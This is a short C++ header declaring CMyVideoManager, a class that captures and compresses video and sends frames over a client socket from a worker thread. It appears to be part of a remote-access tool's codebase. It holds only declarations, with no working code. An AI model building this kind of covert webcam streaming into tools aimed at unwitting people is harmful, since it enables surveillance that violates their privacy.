// MyVideoManager.h: interface for the CMyVideoManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MyVideoManager_H__1EE359F0_BFFD_4B8F_A52E_A8DB87656B91__INCLUDED_)
#define AFX_MyVideoManager_H__1EE359F0_BFFD_4B8F_A52E_A8DB87656B91__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include "MyVideoCap.h"
#include "VideoCodec.h"
class CMyVideoManager : public CManager  
{
public:
	void Destroy();
	bool Initialize();
	CMyVideoManager(CClientSocket *pClient);
	virtual ~CMyVideoManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	void sendBITMAPINFO();
	void sendNextScreen();
	bool m_bIsWorking;
private:
	CMyVideoCap	*m_pMyVideoCap;
	CVideoCodec	*m_pVideoCodec;
	DWORD	m_fccHandler;
	int	m_nVedioWidth;
	int	m_nVedioHeight;

	bool m_bIsCompress;
	HANDLE	m_hWorkThread;
	void ResetScreen(int nWidth, int nHeight);
	static DWORD WINAPI WorkThread(LPVOID lparam);

};

#endif // !defined(AFX_MyVideoManager_H__1EE359F0_BFFD_4B8F_A52E_A8DB87656B91__INCLUDED_)
